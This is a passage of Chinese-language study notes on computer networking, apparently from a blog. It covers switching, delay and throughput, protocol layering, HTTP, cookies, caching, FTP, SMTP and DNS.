它也在连接期间在该网络链路上预留了恒定的传输速率（ 表示为每条链路传输容量的一部分）。 既然已经为该发送方- 接收方连接预留了带宽，则发送方能够以确保的恒定速率向接收方传送数据。</p><ol><li><strong>电路交换网络中的复用</strong></li></ol><p>链路中的电路是通过<strong>频分复用</strong>（ Frequency- Division Multiplexing， FDM ) 或 <strong>时分复用</strong>(Time- Division Multiplexing, TDM) 来实现的。</p><ul><li>对于 <strong>FDM</strong> ， 链路的频谱由跨越链路创建的所有连接共享。特别是， 在连接期间链路为每条连接专用一个频段。 在电话网络中， 这个频段的宽度通常为 4kHz ( 即每秒 4000 周期）。毫无疑问， 该频段的宽度称为带宽（ bandwidth )。</li><li>对于一条 <strong>TDM</strong> 链路， 时间被划分为固定期间的帧， 并且每个帧又被划分为固定数量的时隙。 当网络跨越一条链路创建一条连接时， 网络在每个帧中为该连接指定一个时隙。这些时隙专门由该连接单独使用， 一个时隙（ 在每个帧内） 可用于传输该连接的数据。</li></ul><p><img src="/posts/9d1d146e/image-20220224170445880.png" alt="image-20220224170445880"></p><ol start="2"><li><p>分组交换和电路交换的对比</p><p>分组交换：</p><ul><li><p>优点</p><p>①它提供了比电路交换更好的带宽共享；</p><p>②它比电路交换更简单、 更有效， 实现成本更低。</p></li><li><p>缺点</p><p>分组交换不适合实时服务 （ 例如， 电话和视频会议）， 因为它的端到端时延是可变的和不可预测的（ 主要是因为排队时延的变动和不可预测所致）</p></li></ul><p>电路交换</p><ul><li><p>优点</p><p>电路交换⽹络可以在响应时间内保证⼀定量的端到端带宽。如今⼤部分分组交换⽹络（包括因特⽹）⽆法保证端到端带宽。</p></li><li><p>缺点</p><p>FDM需要复杂的模拟硬件来将信号转换为合适的频率。</p></li></ul></li></ol><h3 id="133-网络的网络"><a class="markdownIt-Anchor" href="#133-网络的网络"></a> 1.3.3 网络的网络</h3><h2 id="14-分组交换网中的时延-丢包和吞吐量"><a class="markdownIt-Anchor" href="#14-分组交换网中的时延-丢包和吞吐量"></a> 1.4 分组交换网中的时延、丢包和吞吐量</h2><h3 id="141-分组交换网中的时延概述"><a class="markdownIt-Anchor" href="#141-分组交换网中的时延概述"></a> 1.4.1 分组交换网中的时延概述</h3><p><img src="/posts/9d1d146e/image-20220224181540152.png" alt="image-20220224181540152"></p><p><strong>时延的类型</strong></p><ol><li><p>处理时延<br>检査分组首部和决定将该分组导向何处所需要的时间是处理时延的一部分。 处理时延也能够包括其他因素， 如检査比特级别的差错所需要的时间</p><p>高速路由器的处理时延通常是微秒或更低的数量级。</p></li><li><p>排队时延<br>在队列中， 当分组在链路上等待传输时， 它经受排队时延。 一个特定分组的排队时延长度将取决于先期到达的正在排队等待向链路传输的分组数量。</p><p>实际的排队时延可以是毫秒到微秒量级。</p></li><li><p>传输时延<br>假定分组以先到先服务方式传输一这在分组交换网中是常见的方式， 仅当所有已经到达的分组被传输后， 才能传输刚到达的分组。 用 L 比特表示该分组的长度， 用 R bps( 即 b/s)表示从路由器 A 到路由器 B 的链路传输速率**。传输时延是 L/R**这是将所有分组的比特推向链路 （ 即传输， 或者说发射）所需要的时间。</p><p>实际的传输时延通常在毫秒到微秒量级。</p></li><li><p>传播时延<br>一旦一个比特被推向链路， 该比特需要向路由器 B 传播。 从该链路的起点到路由器 B传播所需要的时间是传播时延。传播时延等于两台路由器之间的距离除以传播速率。 即传播时延是d/s,其中d是路由器A和路由器B之间的距离，s是该链路的传播速率。</p><p>在广域网中， 传播时延为毫秒量级。</p></li><li><p>传输时延和传播时延的比较<br>传输时延和传播时延之间的差异是微妙而重要的。 <strong>传输时延</strong>是路由器推出分组所需要的时间， 它是分组长度和链路传输速率的函数， 而与两台路由器之间的距离无关。 另一方面，<strong>传播时延</strong>是一个比特从一台路由器传播到另一台路由器所需要的时间， 它是两台路由器之间距离的函数， 而与分组长度或链路传输速率无关。</p></li></ol><p>如果令d<sub>proc</sub>,d<sub>queue</sub>,d<sub>trans</sub>,d<sub>prop</sub>分别表示处理时延、排队时延、传输时延和传播时延，则节点的总时延由下式给定：<br>d<sub>total</sub>=d<sub>proc</sub>+d<sub>queue</sub>+d<sub>trans</sub>+d<sub>prop</sub></p><h3 id="142-排队时延和丢包"><a class="markdownIt-Anchor" href="#142-排队时延和丢包"></a> 1.4.2 排队时延和丢包</h3><p><strong>排队时延</strong></p><p>a表示分组到达队列的平均速率(a的单位是分组/秒，即pkt/s)</p><p>R是传输速率，即从队列中推出比特的速率（以bps即b/s为单位）。</p><p>假定所有分组都是由L比特组成的。 则比特到达队列的平均速率<br>是 La bps。</p><p>比率La/R被称为流量强度（ traffic intensity)， 它在估计排队时延的范围方面经常起着重要的作用。 如果 La/R &gt; 1，则比特到达队列的平均速率超过从该队列传输出去的速率。排队时延将趋向无穷大</p><p><strong>丢包</strong></p><p>一条链路前的队列只有有限的容量， 随着流量强度接近1，排队时延并不真正趋向无穷大。 相反， 到达的分组将发现一个满的队列。 由于没有地方存储这个分组， 路由器将丢弃 (drop) 该分组， 即该分组将会丢失（lost )。</p><h3 id="143-端到端时延"><a class="markdownIt-Anchor" href="#143-端到端时延"></a> 1.4.3 端到端时延</h3><p>d<sub>end-end</sub>=N(d<sub>proc</sub>+d<sub>trans</sub>+d<sub>prop</sub>)</p><p>d<sub>tran</sub>=L/R</p><h3 id="144-计算机网络中的吞吐量"><a class="markdownIt-Anchor" href="#144-计算机网络中的吞吐量"></a> 1.4.4 计算机网络中的吞吐量</h3><p>在任何时间瞬间的瞬时吞吐量 （ instantaneous throughput ) 是主机 B 接收到该文件的速率（ 以 bps 计）</p><p>如果该文件由 F 比特组成， 主机 B 接收到所有 F 比特用去 r 秒，则文件传送的平均吞吐量 （ average throughput ) 是 F/T bps。</p><p><img src="/posts/9d1d146e/image-20220423113712304.png" alt="image-20220423113712304"></p><p>N条链路的传输速率分别是R1 ，R2， …，Rn  我们发现从服务器到客户的文件传输吞吐量是 min{R1，R2 ••• ， Rn} 这同样仍是沿着服务器和客户之间路径的瓶颈链路的速率</p><h2 id="15-协议层次及其服务模型"><a class="markdownIt-Anchor" href="#15-协议层次及其服务模型"></a> 1.5 协议层次及其服务模型</h2><h3 id="151-分层的体系结构"><a class="markdownIt-Anchor" href="#151-分层的体系结构"></a> 1.5.1 分层的体系结构</h3><ol><li><p>协议分层</p><p>各层的所有协议被称为<strong>协议</strong>栈 （ protocol stack )。 因特网的协议栈由5个层次组成： 物理层 、 链路层、 网络层、 运输层和应用层</p><p><img src="/posts/9d1d146e/net.jpg" alt="net"></p><p><img src="/posts/9d1d146e/image-20220224183243758.png" alt="image-20220224183243758"></p><ul><li><p>(1) <strong>应用层</strong><br>应用层是网络应用程序及它们的应用层协议存留的地方。</p><p><strong>应用层协议</strong> ( application- layer protocol ) 定义了运行在不同端系统上的应用程序进程如何相互传递报文</p><p>因特网的应用层包括许多协议， 例如 HTTP ( 它提供了 Web 文档的请求和传送） 、 SMTP ( 它提供了电子邮件报文的传输） 和 FTP (它提供两个端系统之间的文件传送）。</p><p>应用层协议分布在多个端系统上， 而一个端系统中的应用程序使用协议与另一个端系统中的应用程序交换信息分组。 我们把这种位于应用层的信息分组称为<strong>报文</strong> （ message)</p></li><li><p>(2) <strong>运输层</strong><br>因特网的运输层在应用程序端点之间传送应用层报文。</p><p><strong>运输层协议</strong>为运行在不同主机上的应用进程之间提供了<strong>逻辑通信 (logic conmmunication)</strong> 功能。</p><p>在因特网中， 有两种运输协议， 即 <strong>TCP 和 UDP</strong>， 利用其中的任一个都能运输应用层报文。</p><p><strong>TCP</strong> 向它的应用程序提供了面向连接的服务。 这种服务包括了应用层报文向目的地的确保传递和流量控制 （ 即发送方/接收方速率匹配）。 TCP 也将长报文划分为短报文， 并提供拥塞控制机制， 因此当网络拥塞时， 源抑制其传输速率。</p><p><strong>UDP</strong> 协议向它的应用程序提供无连接服务。这是一种不提供不必要服务的服务，没有可靠性，没有流量控制，也没有拥塞控制。</p><p>在本书中， 我们把运输层的分组称为<strong>报文段</strong>（ segment )</p></li><li><p>(3) <strong>网络层</strong><br>因特网的网络层负责将称为<strong>数据报</strong> (datagram) 的网络层分组从一台主机移动到另一台主机。 在一台源主机中的因特网运输层协议（ TCP 或 UDP) 向网络层递交运输层报文段和目的地址， 就像你通过邮政服务寄信件时提供一个目的地址一样。</p><p>因特网的网络层包括著名的<strong>网际协议 IP</strong>， 该协议定义了在数据报中的各个字段以及端系统和路由器如何作用于这些字段。 IP 仅有一个， 所有具有网络层的因特网组件必须运行IP。</p><p>因特网的网络层也包括决定路由的<strong>路由选择协议</strong>， 它根据该路由将数据报从源传输到目的地。</p><p>网络层的分组称为<strong>数据报</strong> ( datagram)</p></li><li><p>(4) <strong>链路层</strong></p><p>链路层的任务是将整个帧从一个网络元素移动到邻近的网络元素</p><p>因特网的网络层通过源和目的地之间的一系列路由器路由数据报。 为了将分组从一个节点（ 主机或路由器） 移动到路径上的下一个节点， 网络层必须依靠该链路层的服务。 特别是在每个节点， 网络层将数据报下传给链路层， 链路层沿着路径将数据报传递给下一个节点。 在该下一个节点，链路层将数据报上传给网络层。</p><p>在本书中， 我们把链路层分组称为<strong>帧</strong>（frame)</p></li><li><p>（5）<strong>物理层</strong><br>物理层的任务是将该帧中的一个个比特从一个节点移动到下一个节点。</p></li><li><blockquote><ul><li>应⽤层报⽂：应⽤程序想发送和通过传输层的数据；</li><li>传输层报文段：由传输层⽣成并且封装有传输层头信息的应⽤层报⽂</li><li>⽹络层数据报：封装有⽹络层头信息的传输层报文段</li><li>链路层帧：封装有链路层头信息的⽹络层数据报</li></ul></blockquote></li></ul></li></ol><h3 id="152-封装"><a class="markdownIt-Anchor" href="#152-封装"></a> 1.5.2 封装</h3><p>封装 （ encapsulation ):</p><ul><li>在发送主机端， 一个<strong>应用层报文</strong> (<code>application-layer message</code>) (图 1-24 中的 M) 被传送给运输层。</li><li>在最简单的情况下，运输层收取到报文并附上附加信息 （ 所谓<strong>运输层首部信息</strong>， 图 1-24 中的 H<sub>l</sub>,)， 该首部将被接收端的运输层使用。 应用层报文和运输层首部信息一道构成了<strong>运输层报文段</strong> （<code>transportlayer segment</code>)。 运输层报文段因此封装了应用层报文。 附加的信息也许包括了下列信息：<ul><li>允许接收端运输层向上向适当的应用程序交付报文的信息；</li><li>差错检测位信息， 该信息让接收方能够判断报文中的比特是否在途中已被改变。</li></ul></li><li>运输层则向网络层传递该报文段， 网络层增加了如源和目的端系统地址等<strong>网络层首部信息</strong>（ 图1-24 中的 H<sub>n</sub>)， 生成了<strong>网络层数据报</strong> ( <code>network-layer datagram</code>)</li><li>该数据报接下来被传递给链路层， 链路层（ 自然而然地）增加它自己的<strong>链路层首部信息</strong>并生成<strong>链路层帧</strong>（ <code>link-layer frame</code>)。</li></ul><p>所以我们看到， 在每一层， 一个分组具有两种类型的字段： <strong>首部字段</strong>和<strong>有效载荷字段</strong> ( payload field )，有效载荷通常是来自上一层的分组</p><h2 id="18小结"><a class="markdownIt-Anchor" href="#18小结"></a> 1.8小结</h2><h1 id="第2章-应用层"><a class="markdownIt-Anchor" href="#第2章-应用层"></a> 第2章 应用层</h1><h2 id="21-应用层协议原理"><a class="markdownIt-Anchor" href="#21-应用层协议原理"></a> 2.1 应用层协议原理</h2><h3 id="211-网络应用程序体系结构"><a class="markdownIt-Anchor" href="#211-网络应用程序体系结构"></a> 2.1.1 网络应用程序体系结构</h3><p>现代网络应用程序中所使用的两种主流体系结构之一：</p><ol><li><p>客户-服务器体系结构</p><p>在客户-服务器体系结构（ client-server architecture) 中， 有一个总是打开的主机称为服务器，它服务于来自许多其他称为客户的主机的请求。</p><p><strong>特点：</strong></p><ul><li>服务器具有特定的周知的IP地址</li><li>集中结构，一对多</li><li>服务器共享资源，客户机资源不共享，客户之间不直接进行通信</li><li>服务器可能负载过重</li><li>网络带宽限制</li></ul></li><li><p>对等（P2P)体系结构</p><ul><li>非集中结构，多对多</li><li>节点具备客户与服务器双重特性</li><li>充分利用终端资源</li><li>可扩展性好</li></ul></li></ol><p><img src="/posts/9d1d146e/image-20220402133154076.png" alt="image-20220402133154076"></p><h3 id="212-进程通信"><a class="markdownIt-Anchor" href="#212-进程通信"></a> 2.1.2 进程通信</h3><p>一个进程可以被认为是运行在端系统中的一个程序</p><ul><li><p>当多个进程运行在相同的端系统上时， 它们使用进程间通信机制相互通信。 进程间通信的规则由端系统上的操作系统确定。</p></li><li><p>在两个不同端系统上的进程， 通过跨越计算机网络交换<strong>报文</strong>（ message) 而相互通信。</p></li></ul><ol><li><p><strong>客户和服务器进程</strong></p><p>在一对进程之间的通信会话场景中， 发起通信（ 即在该会话开始时发起与其他进程的联系） 的进程被标识为<strong>客户</strong>， 在会话开始时等待联系的进程是<strong>服务器</strong>。</p><p>在 Web 中， 一个浏览器进程向一台 Web 服务器进程发起联系， 因此该浏览器进程是<strong>客户</strong>， 而该 Web 服务器进程是服务器。 在 P2P 文件共享中， 当对等方 A 请求对等方 B 发送一个特定的文件时， 在这个特定的通信会话中对等方 A 是<strong>客户</strong>， 而对等方 B 是<strong>服务器</strong>。</p></li><li><p><strong>进程和计算机网络之间的接口</strong></p><p>进程通过一个称为<strong>套接字（ socket )</strong> 的软件接口向网络发送报文和从网络接收报文。</p><p>套接字是应用程序与网络之间的<strong>API（应用程序编程接口）</strong></p></li><li><p><strong>进程寻址</strong></p><p>在一台主机上运行的进程为了向在另一台主机上运行的进程发送分组，接收进程需要有一个地址。为了标识该接收进程，需要定义两种信息： ①主机的地址； ②在目的主机中指定接收进程的标识符。</p><p>主机由其 <strong>IP 地址</strong>(IP address) 标识。</p><p><strong>目的地端口号</strong>（port number)用于在目的主机中指定接收进程的标识符</p></li></ol><h3 id="213-可供应用程序使用的运输服务"><a class="markdownIt-Anchor" href="#213-可供应用程序使用的运输服务"></a> 2.1.3 可供应用程序使用的运输服务</h3><p>我们大体能够从四个方面对应用程序服务要求进行分类： <strong>可靠数据传输、 吞吐量、 定时和安全性</strong>。</p><h3 id="214-因特网提供的运输服务"><a class="markdownIt-Anchor" href="#214-因特网提供的运输服务"></a> 2.1.4 因特网提供的运输服务</h3><p>因特网 （ 更一般的是 TCP/IP 网络） 为应用程序提供两个运输层协议， 即 UDP 和 TCP。</p><ol><li><p><strong>TCP服务</strong></p><ul><li>面向连接: 客户机和服务器之间所需连接的建立</li><li>可靠传输：在发送和接收进程之间</li><li>流量控制: 发送方不会淹没接收方</li><li>拥塞控制:当网络过载时抑制发送方</li><li>并不提供: 定时，最小带宽保证</li></ul></li><li><p><strong>UDP服务</strong></p><p>在发送进程及接收进程之间的不可靠数据传输</p><p>不提供：建立连接，可靠性，流量控制，拥塞控制，定时或带宽保证</p></li></ol><p>为什么需要UDP：</p><blockquote><p>当应用程序<strong>对传输的可靠性要求不高</strong>，但是对<strong>传输速度和延迟要求较高</strong>时，可以用UDP协议来替代TCP协议在传输层控制数据的转发。</p><p>UDP适合于<strong>实时数据传输</strong>，如<strong>语音</strong>和<strong>视频通信</strong>，因为它们即使偶尔丢失一两个数据包，也不会对接收结果产生太大影响。例如：我们在看视频的时候偶尔丢一两个包也不影响体验。</p></blockquote><h3 id="215-应用层协议"><a class="markdownIt-Anchor" href="#215-应用层协议"></a> 2.1.5 应用层协议</h3><p><strong>应用层协议</strong> ( application- layer protocol ) 定义了运行在不同端系统上的应用程序进程如何相互传递报文</p><p>特别的，应用层协议定义了：</p><ul><li>交换的报文类型， 例如请求报文和响应报文。</li><li>各种报文类型的语法， 如报文中的各个字段及这些字段是如何描述的。</li><li>字段的语义， 即这些字段中的信息的含义。</li><li>确定一个进程何时以及如何发送报文，对报文进行响应的规则。</li></ul><h2 id="22-web和http"><a class="markdownIt-Anchor" href="#22-web和http"></a> 2.2 Web和HTTP</h2><h3 id="221-http概况"><a class="markdownIt-Anchor" href="#221-http概况"></a> 2.2.1 HTTP概况</h3><p>Web的应用层协议是<strong>超文本传输协议（HyperText Transfer Protocol，HTTP)</strong>, 它是 Web的核心。 HTTP 由两个程序实现： 一个客户程序和一个服务器程序。 客户程序和服务器程序运行在不同的端系统中， 通过交换HTTP 报文进行会话。 HTTP定义了这些报文的结构以及客户和服务器进行报文交换的方式。</p><p><strong>web术语：</strong></p><ul><li><p>Web页面由对象组成</p><ul><li>一个基本HTML文件</li><li>多个引用对象：图片，java小程序，视频文件</li></ul></li><li><p>每个对象可由URL寻址</p></li><li><p>URL( Uniform Resource Locator 统一资源定位符)的例子:</p></li></ul><p><img src="/posts/9d1d146e/image-20220402140838360.png" alt="image-20220402140838360"></p><p><strong>HTTP使用TCP作为它的支撑运输协议:</strong></p><ul><li>客户机向服务器发起TCP连接(产生套接字) ，端口80</li><li>服务器从客户机接受TCP连接</li><li>在浏览器(HTTP客户机)和Web服务器(HTPP服务器)之间交换HTTP报文 (应用层协议报文)</li><li>关闭TCP连接</li></ul><p><strong>HTTP是“无状态的”：</strong></p><ul><li>服务器不保留有关客户机过去请求的任何信息</li><li>用户的状态信息由Cookies来实现</li></ul><h3 id="222-非持续连接和持续连接"><a class="markdownIt-Anchor" href="#222-非持续连接和持续连接"></a> 2.2.2 非持续连接和持续连接</h3><ol><li><p><strong>非持久HTTP</strong></p><p>每个HTTP请求/响应对经过一个单独TCP连接发送</p><p>HTTP/1.0使用非持久HTTP</p></li></ol><ul><li><p><strong>往返时间RTT的定义:</strong> 从客户机到服务器发送一个小分组并返回所历经的时间.</p></li><li><p><strong>响应时间(1个HTML文件):</strong></p><ul><li>建立TCP连接：1个RTT</li><li>对HTTP请求和响应返回的前几个字节：1个RTT</li><li>文件传输时间</li></ul></li><li><p><strong>总响应 = 2RTT+传输时间</strong></p></li><li><p><strong>非持久HTTP缺点:</strong></p><ul><li>串行访问时间长，每一个对象经受两倍 RTT 的交付时延</li><li>并行访问资源占用多，必须为每一个请求的对象建立和维护一个全新的连接。</li></ul></li></ul><ol start="2"><li><p><strong>持久HTTP</strong></p><p>多个对象能够经过客户机和服务器之间的单个TCP连接发送</p><p>HTTP/1.1以默认模式使用持久连接</p></li></ol><ul><li><p>在发送响应后，保持TCP连接持续打开</p></li><li><p>后继HTTP报文通过该连接持续发送</p></li></ul><h3 id="223-http报文格式"><a class="markdownIt-Anchor" href="#223-http报文格式"></a> 2.2.3 HTTP报文格式</h3><p>HTTP报文有两种： <strong>请求报文和响应报文</strong>。</p><ol><li><p><strong>HTTP请求报文</strong></p><p><img src="/posts/9d1d146e/image-20220402142759631.png" alt="image-20220402142759631"></p></li></ol><ul><li><p>通用格式：</p><p><strong>请求行</strong>（ request line )：第1行，方法字段，URL字段，HTTP 版本字段</p><ul><li><p>方法字段可以取几种不同的值， 包括 GET、 POST、 HEAD、 PUT 和 DELETE</p></li><li><p>方法类型：</p><ul><li><p>GET：最常用，请求访问网页，实体主体为空</p></li><li><p>POST：常用，提交表单同时请求访问网页，如使用搜索引擎，实体主体中为表单输入值</p></li><li><p>HEAD：少用，测试用，与GET区别在于响应中去掉请求的对象</p></li><li><p>PUT：很少用，向URL字段中定义的路径，上载在实体主体中文件</p></li><li><p>DELETE，很少用，删除在URL字段中定义的文件</p></li></ul></li></ul><p><strong>首部行</strong>（header line)：一般多行</p><ul><li>host:www.someschool.edu 指明了对象所在的主机</li><li>Connection: dose 首部行， 该浏览器告诉服务器不要麻烦地使用持续连接， 它要求服务器在发送完被请求的对象后就关闭这条连接</li><li>User-agent ：首部行用来指明用户代理，即向服务器发送请求的浏览器的类型。 因为服务器可以有效地为不同类型的用户代理实际发送相同对象的不同版本</li><li>Accept- language：首部行表示用户想得到该对象的法语版本</li></ul></li></ul><p><strong>实体主体</strong>：可为空</p><p><img src="/posts/9d1d146e/image-20220402142817548.png" alt="image-20220402142817548"></p><ol><li><p><strong>HTTP响应报文</strong></p><p><img src="/posts/9d1d146e/image-20220402143506343.png" alt="image-20220402143506343"></p></li></ol><ul><li><p>通用格式：</p><p>**状态行：**第1行，版本字段，状态码字段，短语字段</p><ul><li>一些常见的状态码和相关的短语包括：<ul><li>200 0K： 请求成功， 信息在返回的响应报文中。</li><li>301 Moved Permanently： 请求的对象已经被永久转移了， 新的 URL 定义在响应报文的 Location: 首部行中。 客户软件将自动获取新的 URL。</li><li>400 Bad Request： 一个通用差错代码， 指示该请求不能被服务器理解。</li><li>404 Not Found： 被请求的文档不在服务器上。</li><li>505 HTTP Version Not Supported： 服务器不支持请求报文使用的 HTTP 协议版本</li></ul></li></ul><p>**首部行：**一般多行</p><ul><li>服务器用 Cmmection: dose 首部行告诉客户， 发送完报文后将关闭该 TCP 连接。</li><li>Date： 首部行指示服务器产生并发送该响应报文的日期和时间。 值得提的是， 这个时间不是指对象创建或者最后修改的时间， 而是服务器从它的文件系统中检索到该对象， 将该对象插入响应报文， 并发送该响应报文的时间。</li><li>Server： 首部行指示该报文是由一台 Apache Web 服务器产生的， 它类似于 HTTP 请求报文中的 User- agent: 首部行。</li><li>Last- Modified ： 首部行指示了对象创建或者最后修改的日期和时间。 Last- Modified ：首部行对既可能在本地客户也可能在网络缓存服务器上的对象缓存来说非常重要。 我们将很快详细地讨论缓存服务器 （ 也叫代理服务器）。</li><li>Content-Length： 首部行指示了被发送对象中的字节数。</li><li>Content- Type： 首部行指示了实体体中的对象是 HTML 文本。</li></ul><p>**实体主体：**报文的主体</p></li></ul><p><img src="/posts/9d1d146e/image-20220402143709761.png" alt="image-20220402143709761"></p><h3 id="224-用户与服务器的交互cookie"><a class="markdownIt-Anchor" href="#224-用户与服务器的交互cookie"></a> 2.2.4 用户与服务器的交互：cookie</h3><p>cookie 技术有4个组件：</p><ul><li><p>①在 HTTP 响应报文中的一个 cookie 首部行；</p></li><li><p>②在 HTTP 请求报文中的一个 cookie 首部行；</p></li><li><p>③在用户端系统中保留有一个 cookie 文件， 并由用户的浏览器进行管理；</p></li><li><p>④位于Web站点的一个后端数据库。</p></li></ul><p><img src="/posts/9d1d146e/image-20220402145130143.png" alt="image-20220402145130143"></p><h3 id="225-web缓存"><a class="markdownIt-Anchor" href="#225-web缓存"></a> 2.2.5 Web缓存</h3><p>Web 缓存器（ Web cache) 也叫<strong>代理服务器（ proxy server)</strong>， 它是能够代表初始 Web 服务器来满足 HTTP 请求的网络实体。</p><ul><li>对象在缓存中：缓存返回对象</li><li>否则缓存向起始服务器请求对象，然后向客户机返回对象</li></ul><p>好处：</p><ul><li><p>1）减小客户机请求的响应时间；</p></li><li><p>2）减少机构内部网与因特网接入链路的通信量</p></li></ul><h3 id="226-条件get方法"><a class="markdownIt-Anchor" href="#226-条件get方法"></a> 2.2.6 条件GET方法</h3><p>HTTP 协议有一种机制， 允许缓存器证实它的对象是最新的。 这种机制就是<strong>条件 GET ( conditional GET) 方法</strong>。 如果：</p><p>①请求报文使用 GET方法；</p><p>②请求报文中包含一个 “ If- Modified - Since:” 首部行。 那么， 这个 HTTP 请求报文就是一个条件 GET 请求报文。</p><p>缓存器通过发送一个条件 GET 执行最新检查</p><p><img src="/posts/9d1d146e/image-20220424210534316.png" alt="image-20220424210534316"></p><p>该条件 GET 报文告诉服务器， 仅当自指定日期之后该对象被修改过， 才发送该对象</p><h2 id="225-文件传输协议"><a class="markdownIt-Anchor" href="#225-文件传输协议"></a> 2.2.5 文件传输协议</h2><p>双TCP连接</p><ul><li>控制连接，端口21（http带内控制，ftp带外控制）</li><li>数据连接，端口20</li></ul><p>通过操作命令实现远程交互式访问</p><ul><li>登录，用户名，密码</li><li>浏览文件</li><li>选择文件，下载</li></ul><p>为什么要有两条连接：</p><blockquote><p>控制连接控制FTP命令</p><p>数据连接用于文件传送</p><p>两条连接使得FTP更加简单、更容易实现、更有效率。同时在文件传输过程中，还可以利用控制连接控制传输进程，如用户可以请求终止、暂停传输等</p></blockquote><h2 id="23-因特网中的电子邮件"><a class="markdownIt-Anchor" href="#23-因特网中的电子邮件"></a> 2.3 因特网中的电子邮件</h2><p>电子邮件系统3个主要组成部分： <strong>用户代理</strong> （ user agent)、 <strong>邮件服务器</strong> （ mail server) 和<strong>简单邮件传输协议</strong>（ Simple Mail Transfer Protocol, <strong>SMTP</strong>)。</p><h3 id="231-smtp"><a class="markdownIt-Anchor" href="#231-smtp"></a> 2.3.1 SMTP</h3><ul><li><p>SMTP是一个相对简单的基于文本的协议</p><p>报文必须以7比特ASCII格式</p><p>二进值文件可通过MIME编码后再传</p></li><li><p>SMTP服务器端使用端口号25</p></li><li><p>采用命令/响应交互</p><p>命令：HELO，MAIL FROM, RCPT TO, DATA, QUIT</p><p>响应：状态码及短语</p></li><li><p>传输的三个阶段</p><p>握手，传输，关闭</p></li></ul><p>SMTP交互示例：</p><p><img src="/posts/9d1d146e/image-20220402154034434.png" alt="image-20220402154034434"></p><h3 id="232-与http的对比"><a class="markdownIt-Anchor" href="#232-与http的对比"></a> 2.3.2 与HTTP的对比</h3><p>共同特征：</p><p>持续的 HTTP 和 SMTP 都使用持续连接</p><p>区别：</p><ul><li><p>首先， HTTP 主要是一个拉协议 （ pull protocol ),即在方便的时候， 某些人在 Web 服务器上装载信息， 用户使用 HTTP 从该服务器拉取这些信息。 特别是 TCP 连接是由想接收文件的机器发起的。 另一方面， SMTP 基本上是一个推协议 ( push protocol) , 即发送邮件服务器把文件推向接收邮件服务器。 特别是， 这个 TCP连接是由要发送该文件的机器发起的。</p></li><li><p>第二个区别就是我们前面间接地提到过的， SMTP 要求每个报文（ 包括它们的体） 采用 7 比特 ASCII 码格式。 如果某报文包含了非 7 比特 ASCII 字符（ 如具有重音的法文字符） 或二进制数据 （ 如图形文件） ， 则该报文必须按照7 比特 ASCII 码进行编码。 HTTP 数据则不受这种限制。</p></li><li><p>第三个重要区别是如何处理一个既包含文本又包含图形 （ 也可能是其他媒体类型） 的文档。 如我们在 2. 2 节知道的那样， HTTP 把每个对象封装到它自己的 HTTP 响应报文中，而 SMTP 则把所有报文对象放在一个报文之中。</p></li></ul><h3 id="233-邮件报文格式"><a class="markdownIt-Anchor" href="#233-邮件报文格式"></a> 2.3.3 邮件报文格式</h3><p><img src="/posts/9d1d146e/image-20220402154441163.png" alt="image-20220402154441163"></p><p><img src="/posts/9d1d146e/image-20220402154457074.png" alt="image-20220402154457074"></p><h3 id="234-邮件访问协议"><a class="markdownIt-Anchor" href="#234-邮件访问协议"></a> 2.3.4 邮件访问协议</h3><p><img src="/posts/9d1d146e/image-20220402154724156.png" alt="image-20220402154724156"></p><p>SMTP 用来将邮件从发送方的邮件服务器传输到接收方的邮件服务器； SMTP 也用来将邮件从发送方的用户代理传送到发送<br>方的邮件服务器。 如 POP3 这样的邮件访问协议用来将邮件从接收方的邮件服务器传送到接收方的用户代理</p><p>邮件访问协议：从服务器获取邮件</p><ul><li><p>POP3: 邮局协议 （ Post Office Protocol ）</p><ul><li>授权 (代理 &lt;–&gt;服务器) 并下载</li></ul></li><li><p>IMAP4: 因特网邮件访问协议</p><ul><li>更多功能</li><li>操作存储在服务器上的报文</li></ul></li></ul><h2 id="24-dns因特网的目录服务"><a class="markdownIt-Anchor" href="#24-dns因特网的目录服务"></a> 2.4 DNS:因特网的目录服务</h2><p>域名系统( Domain Name System, DNS) 是：</p><ul><li><p>①一个由分层的 DNS 服务器 （ DNS) 实现的分布式数据库；</p></li><li><p>②一个使得主机能够査询分布式数据库的应用层协议。</p></li></ul><p>DNS 服务器通常是运行 BIND ( Berkeley Internet Name Domain ) 软件 [ BIND 2012 ] 的UNIX 机器。 <strong>DNS 协议运行在 UDP 之上， 使用 53 号端口。</strong></p><h3 id="241-dns提供的服务"><a class="markdownIt-Anchor" href="#241-dns提供的服务"></a> 2.4.1 DNS提供的服务</h3><ul><li>主机名到IP地址的转换</li><li>主机别名 ( host aliasing)</li><li>邮件服务器别名</li><li>负载分配（load distribution)</li></ul><h3 id="242-dns工作机理概述"><a class="markdownIt-Anchor" href="#242-dns工作机理概述"></a> 2.4.2 DNS工作机理概述</h3><ol><li><p>分布式、 层次数据库</p><p>为了处理扩展性问题， DNS 使用了大量的 DNS 服务器， 它们以层次方式组织， 并且分布在全世界范围内。 没有一台 DNS 服务器拥有因特网上所有主机的映射。 相反 ，这些映射分布在所有的 DNS 服务器上。</p><p>大致说来， 有 3 种类型的 DNS 服务器：</p><ul><li>根 DNS服务器</li><li>顶级域 （ Top- Level Domain， TLD) DNS 服务器</li><li>权威 DNS 服务器。</li></ul><p><img src="/posts/9d1d146e/image-20220402161351957.png" alt="image-20220402161351957"></p><p>下图利用了<strong>递归查询</strong> （ recursive query ) 和<strong>迭代查询</strong> （ iterative query )。</p><p>从 <a href="http://cse.nyu.edu">cse.nyu.edu</a> 到 <a href="http://dns.nyu.edu">dns.nyu.edu</a> 发出的査询是递归査询， 因为该査询以自己的名义请求edu 来获得该映射。</p><p>而后继的 3 个査询是迭代査询， 因为所有的回答都是直接返回给 <a href="http://dns.nyu.edu">dns.nyu.edu</a>。</p><p><img src="/posts/9d1d146e/image-20220402162935662.png" alt="image-20220402162935662"></p><p><strong>递归查询</strong></p><p><img src="/posts/9d1d146e/image-20220402163041113.png" alt="image-20220402163041113"></p></li><li><p>DNS缓存</p><p>为了改善时延性能并减少在因特网上到处传输的 DNS 报文数量，DNS 广泛使用了缓存技术。 DNS 缓存的原理非常简单。 在一个请求链中， 当某 DNS服务器接收一个 DNS 回答（ 例如， 包含某主机名到 IP 地址的映射） 时， 它能将映射缓存在本地存储器中。</p></li></ol><h3 id="243-dns记录和报文"><a class="markdownIt-Anchor" href="#243-dns记录和报文"></a> 2.4.3 DNS记录和报文</h3><p><img src="/posts/9d1d146e/image-20220402163520140.png" alt="image-20220402163520140"></p><p>TTL 是该记录的生存时间， 它决定了资源记录应当从缓存中删除的时间。 在下面给出的记录例子中， 我们忽略掉 TTL 字段。 Name 和 Value 的值取决于 Type：</p><ul><li>如果 